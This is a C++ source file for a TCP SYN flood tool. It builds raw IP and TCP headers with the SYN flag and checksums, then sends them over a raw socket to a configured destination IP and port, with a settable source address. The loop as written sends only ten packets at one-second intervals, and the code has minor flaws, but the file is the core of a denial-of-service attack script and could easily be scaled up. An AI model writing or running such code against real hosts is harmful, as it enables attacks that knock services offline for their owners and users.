#include "tcp_synflood.h"

using namespace std;

struct pseudo_header
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	TCPHDR tcp_header;
};

int main(int argc, char *argv[])
{
    SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (socket_fd == SOCKET_ERROR)
    {
        printf("Socket creation failed.\n");
        exit(-1);
    }
    else
    {
        char packet[PACKET_SIZE], *data;
        IPHDR* ip_header = (IPHDR*)packet;
        TCPHDR* tcp_header = (TCPHDR*)(packet + sizeof(struct ip));
        SOCKADDR_IN sin;

        const int one = 1;
        if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0 &&
           setsockopt(socket_fd, IPPROTO_IP, IP_NODEFRAG, &one, sizeof(one)) < 0)
        {
            printf("Error while setting socket options.\n");
            exit(-2);
        }
        else
        {
            for(int i = 0; i < 10; i++)
            {
                memset(packet, 0, PACKET_SIZE);
                fill_ip_header(ip_header);
                fill_tcp_header(tcp_header, 0);

                sin.sin_family = AF_INET;
                sin.sin_port = htons(DST_PORT);
                sin.sin_addr.s_addr = inet_addr(DST_IP);

                if (sendto(socket_fd, packet, ip_header->tot_len, 0, (SOCKADDR *) &sin, sizeof(sin)) < 0)
		        {
			        printf("Error while sending packet.\n");
                    exit(-3);
		        }
		        else
		        {
			        printf("Packet sent successfully !\n");
                    this_thread::sleep_for(chrono::milliseconds(1000));
		        }
            }
        }
    }

    return EXIT_SUCCESS;
}

void fill_ip_header(IPHDR *ip_header)
{
    unsigned short packet_id = get_rand();

    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR);
    ip_header->id = htons(packet_id);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(SRC_IP);
    ip_header->daddr = inet_addr(DST_IP);

    ip_header->check = csum((unsigned short *)ip_header, ip_header->tot_len);
}

void fill_tcp_header(TCPHDR *tcp_header, size_t data_len)
{
    tcp_header->source = htons(get_rand());
    tcp_header->dest = htons(DST_PORT);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(29200);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    PSD_HEADER pseudo_header;
    pseudo_header.source_address = inet_addr(SRC_IP);
    pseudo_header.dest_address = inet_addr(DST_IP);
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(sizeof(TCPHDR) + data_len);

    int p_size = sizeof(PSD_HEADER) + sizeof(TCPHDR) + data_len;
    char *pseudo_packet = (char *)malloc(p_size);
    memcpy(pseudo_packet, (char *)&pseudo_header, sizeof(PSD_HEADER));
    memcpy(pseudo_packet + sizeof(PSD_HEADER), tcp_header, sizeof(TCPHDR) + data_len);

    tcp_header->check = csum((unsigned short *)pseudo_packet, p_size);
    free(pseudo_packet);
    pseudo_packet = nullptr;
}

unsigned short csum(unsigned short *ptr,int nbytes)
{
	unsigned long check_sum = 0;

	while(nbytes > 1)
    {
		check_sum += *ptr++;
		nbytes -= sizeof(unsigned short);
	}

	if(nbytes == 1)
    {
		check_sum += *(unsigned char *)ptr;
	}

	check_sum = (check_sum >> 16) + (check_sum & 0xffff);
	check_sum += (check_sum >> 16);
	
	return (unsigned short)(~check_sum);;
}

unsigned short get_rand()
{
    unsigned short random_value = 0;
    size_t size = sizeof(random_value);
    ifstream urandom("/dev/urandom", ios::in | ios::binary);
    if(urandom)
    {
        urandom.read(reinterpret_cast<char*>(&random_value), size);
        urandom.close();
    }
    else
    {
        cerr << "Failed to open stream /dev/urandom" << endl;
        random_value = 35789;
    }

    return random_value;
}